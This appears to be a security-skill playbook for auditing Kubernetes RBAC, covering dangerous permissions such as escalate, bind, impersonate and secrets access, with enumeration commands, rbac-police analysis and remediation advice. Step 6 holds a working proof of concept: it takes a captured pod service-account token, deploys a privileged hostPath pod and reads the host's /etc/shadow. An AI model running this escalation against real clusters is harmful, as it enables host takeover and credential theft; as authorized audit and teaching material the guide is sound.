---
name: auditing-kubernetes-rbac-privilege-escalation
description: Find over-permissive RBAC roles and service-account token abuse paths in Kubernetes using kubectl auth can-i, rbac-police, kubectl-who-can, and rakkess during authorized cluster security reviews.
domain: cybersecurity
subdomain: container-security
tags:
- kubernetes
- rbac
- privilege-escalation
- service-account
- least-privilege
- kubectl
- access-control
- attack-paths
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.AA-05
mitre_attack:
- T1078
---
# Auditing Kubernetes RBAC Privilege Escalation

> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Enumerating and exercising RBAC permissions affects a live cluster's access posture. Only test clusters you own or are explicitly authorized in writing to assess.

## Overview

Kubernetes Role-Based Access Control (RBAC, MITRE ATT&CK T1078 Valid Accounts) governs what every user and service account may do via `Role`/`ClusterRole` rules bound by `RoleBinding`/`ClusterRoleBinding`. Because workloads run with a mounted service-account token by default, an attacker who compromises one pod inherits that account's RBAC rights. Over-permissive bindings turn a single compromised pod into a cluster takeover: certain verbs and resources are "RBAC-equivalent to cluster-admin."

Per the Kubernetes "RBAC Good Practices" guidance and Unit 42 research, the dangerous primitives are:

- **`escalate` on roles** — grant yourself any permission, even ones you do not hold.
- **`bind` on clusterroles** — create a binding to `cluster-admin`.
- **`impersonate`** on users/groups/serviceaccounts — act as any subject including `system:masters`.
- **`create`/`update`/`patch` on `pods`** — schedule a privileged pod or mount the node, escaping to the host (T1611).
- **`create` on `pods/exec`, `pods/attach`, `pods/ephemeralcontainers`** — run code in any existing pod.
- **`get`/`list`/`watch` on `secrets`** — list returns full secret contents, including other service-account tokens.
- **`create` on `serviceaccounts/token`** — mint tokens for more privileged accounts.
- **`update`/`patch` on `validatingwebhookconfigurations`/`mutatingwebhookconfigurations`, `nodes/proxy`, `certificatesigningrequests/approval`** — admission/CSR abuse to cluster-admin.
- **Wildcards** (`verbs: ["*"]`, `resources: ["*"]`) — implicit super-privilege.

This skill systematically enumerates effective permissions for every subject, maps which subjects hold these escalation primitives, and produces remediation evidence. Source: Kubernetes RBAC Good Practices; Unit 42 Kubernetes RBAC research.

## When to Use

- During an authorized Kubernetes security assessment or cluster penetration test
- After compromising a pod, to determine what its service-account token can reach
- When reviewing RBAC drift before a production go-live
- When validating least-privilege after a platform migration or Helm rollout

## Prerequisites

- `kubectl` configured against the target cluster (your own credentials, or a captured service-account token)
- Read access to RBAC objects (most audits run with a cluster-reader or admin context)
- Audit tooling:
  ```bash
  # rbac-police - find escalation paths (Cymulate)
  curl -L https://github.com/PaloAltoNetworks/rbac-police/releases/latest/download/rbac-police-linux-amd64 -o rbac-police
  chmod +x rbac-police

  # kubectl-who-can - which subjects can perform an action (Aqua)
  kubectl krew install who-can

  # rakkess - access matrix of resources x verbs for the current/another subject
  kubectl krew install access-matrix

  # rbac-lookup - which roles a subject has (FairwindsOps)
  kubectl krew install rbac-lookup
  ```

## Objectives

- Inventory all `Role`, `ClusterRole`, `RoleBinding`, and `ClusterRoleBinding` objects
- Enumerate effective permissions per subject using `kubectl auth can-i --as`
- Identify subjects holding RBAC-equivalent-to-admin primitives
- Trace token-mounting pods to over-privileged service accounts
- Demonstrate (in a lab) one escalation path end-to-end
- Output a prioritized findings report with least-privilege remediation

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|--------------|------|--------|
| T1078 | Valid Accounts | Defense Evasion / Persistence / Privilege Escalation |
| T1098 | Account Manipulation | Persistence |
| T1528 | Steal Application Access Token | Credential Access |
| T1613 | Container and Resource Discovery | Discovery |
| T1611 | Escape to Host | Privilege Escalation |

## Workflow

### Step 1: Inventory RBAC Objects

```bash
# All roles and bindings, cluster-wide
kubectl get clusterroles,clusterrolebindings -o wide
kubectl get roles,rolebindings --all-namespaces -o wide

# Dump full RBAC for offline analysis
kubectl get clusterroles,clusterrolebindings,roles,rolebindings \
  --all-namespaces -o yaml > rbac-dump.yaml

# Who is bound to cluster-admin?
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name=="cluster-admin") |
         .metadata.name + " -> " + (.subjects // [] | map(.kind+"/"+.name) | join(","))'
```

### Step 2: Enumerate Effective Permissions per Subject

`kubectl auth can-i` is the authoritative check because it evaluates the live authorizer (RBAC + webhooks). Use `--as` to impersonate a subject (requires impersonate rights for the audit identity).

```bash
# Full access matrix for a service account
kubectl auth can-i --list \
  --as=system:serviceaccount:default:default

# Targeted dangerous-permission probes
kubectl auth can-i create pods --all-namespaces \
  --as=system:serviceaccount:dev:builder
kubectl auth can-i get secrets --all-namespaces \
  --as=system:serviceaccount:dev:builder
kubectl auth can-i create serviceaccounts/token -n kube-system \
  --as=system:serviceaccount:dev:builder
kubectl auth can-i '*' '*' --all-namespaces \
  --as=system:serviceaccount:dev:builder

# rakkess full verb x resource matrix for a subject
kubectl access-matrix --as system:serviceaccount:dev:builder
```

### Step 3: Hunt the Escalation Primitives

```bash
# Who can perform each dangerous action across the cluster?
kubectl who-can create pods
kubectl who-can '*' '*'                      # wildcard god-mode holders
kubectl who-can get secrets
kubectl who-can list secrets
kubectl who-can create pods/exec
kubectl who-can impersonate users
kubectl who-can create serviceaccounts/token
kubectl who-can update clusterrolebindings   # bind-style escalation

# grep the raw dump for escalate/bind/impersonate verbs and wildcards
grep -nE 'escalate|impersonate|"\*"|- bind' rbac-dump.yaml
```

### Step 4: Run Automated Escalation-Path Analysis with rbac-police

rbac-police evaluates Rego policies over a cluster snapshot to surface principals that can escalate to cluster-admin and the exact path.

```bash
# Run all built-in escalation checks (needs a kubeconfig with read access)
./rbac-police eval ./lib/policies/

# Only the privilege-escalation policy, severe findings as JSON
./rbac-police eval ./lib/policies/can_escalate.rego -f json -o findings.json

# Collect a snapshot first (offline analysis / air-gapped review)
./rbac-police collect -o cluster-snapshot.json
./rbac-police eval ./lib/policies/ --collect-results cluster-snapshot.json
```

### Step 5: Trace Pods to Over-Privileged Service Accounts

A finding only matters if a reachable workload mounts that token.

```bash
# Map every pod to its service account
kubectl get pods --all-namespaces \
  -o custom-columns='NS:.metadata.namespace,POD:.metadata.name,SA:.spec.serviceAccountName'

# Find pods that auto-mount tokens (the default) tied to risky SAs
kubectl get pods --all-namespaces -o json | jq -r '
  .items[] | select(.spec.automountServiceAccountToken != false) |
  "\(.metadata.namespace)/\(.metadata.name) -> \(.spec.serviceAccountName // "default")"'

# rbac-lookup: what does that service account actually hold?
kubectl rbac-lookup builder --kind serviceaccount
```

### Step 6: Demonstrate an Escalation Path (Lab Only)

Example: a service account with `create pods` and access to a node can schedule a privileged pod that mounts the host filesystem.

```bash
# Using a captured token, target the API server directly
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://kubernetes.default.svc

# Confirm the dangerous right
kubectl --token="$TOKEN" --server="$APISERVER" --insecure-skip-tls-verify \
  auth can-i create pods

# Schedule a privileged host-mounting pod (proves node/host takeover)
cat <<'EOF' | kubectl --token="$TOKEN" --server="$APISERVER" \
  --insecure-skip-tls-verify apply -f -
apiVersion: v1
kind: Pod
metadata: {name: escalate-poc, namespace: default}
spec:
  containers:
  - name: x
    image: alpine
    command: ["/bin/sh","-c","cat /host/etc/shadow; sleep 1d"]
    securityContext: {privileged: true}
    volumeMounts: [{name: host, mountPath: /host}]
  volumes: [{name: host, hostPath: {path: /}}]
EOF
kubectl logs escalate-poc   # host /etc/shadow proves escalation
```

### Step 7: Report and Remediate

```bash
# Generate a least-privilege-violation summary
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | select(.roleRef.name=="cluster-admin") |
  "FINDING cluster-admin bound to: " +
  ((.subjects // []) | map(.kind+":"+.name) | join(", "))'
```

Remediation: replace wildcards with explicit verbs/resources; remove `escalate`/`bind`/`impersonate` unless required; set `automountServiceAccountToken: false` on workloads that do not call the API; scope `Role` (namespaced) over `ClusterRole` where possible; use `aggregationRule` carefully.

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| kubectl auth can-i | Authoritative live permission check (`--list`, `--as`) | https://kubernetes.io/docs/reference/access-authn-authz/authorization/ |
| rbac-police | Rego-based escalation-path analysis | https://github.com/PaloAltoNetworks/rbac-police |
| kubectl-who-can | Reverse lookup: who can do X | https://github.com/aquasecurity/kubectl-who-can |
| rakkess (access-matrix) | Verb x resource matrix per subject | https://github.com/corneliusweig/rakkess |
| rbac-lookup | Roles a subject holds | https://github.com/FairwindsOps/rbac-lookup |
| Kubernetes RBAC Good Practices | Authoritative escalation primitive list | https://kubernetes.io/docs/concepts/security/rbac-good-practices/ |

## Dangerous RBAC Primitives Reference

| Verb / Resource | Why It Is Cluster-Admin-Equivalent |
|-----------------|------------------------------------|
| `escalate` on roles | Grant self any permission |
| `bind` on clusterroles | Bind self to cluster-admin |
| `impersonate` users/groups | Act as system:masters |
| `create pods` (+ node access) | Privileged/hostPath pod -> host takeover |
| `create pods/exec`,`pods/attach` | Run code in existing pods |
| `get`/`list` secrets | Read all tokens & credentials |
| `create serviceaccounts/token` | Mint privileged tokens |
| `*`/`*` (wildcards) | Implicit super-privilege |

## Validation Criteria

- [ ] All Role/ClusterRole/Binding objects inventoried and dumped
- [ ] cluster-admin subject list enumerated
- [ ] Effective permissions enumerated per service account via `auth can-i --list`
- [ ] All dangerous-primitive holders identified (escalate/bind/impersonate/secrets/pods)
- [ ] rbac-police escalation paths reviewed
- [ ] Token-mounting pods mapped to risky service accounts
- [ ] At least one escalation path demonstrated in a lab
- [ ] Findings report with least-privilege remediation produced
- [ ] All testing stayed within authorized scope
